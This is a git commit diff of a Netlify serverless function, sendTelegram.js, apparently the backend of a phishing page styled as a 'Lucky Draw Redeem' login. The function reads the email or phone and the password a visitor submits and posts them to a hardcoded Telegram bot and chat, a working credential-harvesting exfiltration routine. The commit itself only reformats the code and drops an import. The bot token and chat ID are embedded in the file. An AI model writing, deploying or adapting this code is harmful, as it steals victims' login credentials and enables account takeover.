ad6b269bfc32c0e9d81978ca76a6d03531524d2f
BORSAV <psychoborsav999@gmail.com>
2025-10-29 21:56:25 +0530

    Update sendTelegram.js

--- netlify/functions/sendTelegram.js
+++ netlify/functions/sendTelegram.js
@@ -1,21 +1,20 @@
-const fetch = require('node-fetch');
-
 exports.handler = async function(event, context) {
   const TELEGRAM_BOT_TOKEN = '8198072305:AAGbzp_knrOkr1nyLXDrNby7969mT42d_Fk';
   const TELEGRAM_CHAT_ID = '5983644996';
-  
+
   try {
     const { emailOrPhone, password } = JSON.parse(event.body);
 
     const message = `🎉 Lucky Draw Redeem Login Details:\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}`;
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
     const response = await fetch(url, {
       method: 'POST',
-      headers: {'Content-Type': 'application/json'},
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
-        text: message
+        text: message,
       }),
     });
 
